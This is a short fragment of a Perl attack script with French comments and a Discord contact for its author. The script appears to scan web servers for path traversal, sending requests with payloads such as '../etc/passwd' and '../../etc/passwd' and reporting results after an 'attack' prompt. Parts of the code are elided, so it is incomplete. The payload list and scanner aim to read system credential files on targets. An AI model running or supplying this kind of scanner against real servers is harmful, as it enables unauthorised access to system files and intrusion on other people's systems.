#!/usr/bin/perl
#Si vous rencontrez des problèmes contactez moi sur discord : ' 𝐊𝐢𝐫𝐮𝐚 | 𝐕𝐞𝐬𝐩𝐚#1401
use LWP::UserAgent;
use HTTP::Request;
...
print $resp->headers_as_string;print "\n>Parré à l'attaque capitaine appuyez sur [enter]\n";
$start =<STDIN>;
@vuls = ('/etc/passwd',
'../etc/passwd',
'../../etc/passwd',
...
else { $msg = "Ya R frr";}print "$scan..........[$msg]\n";
}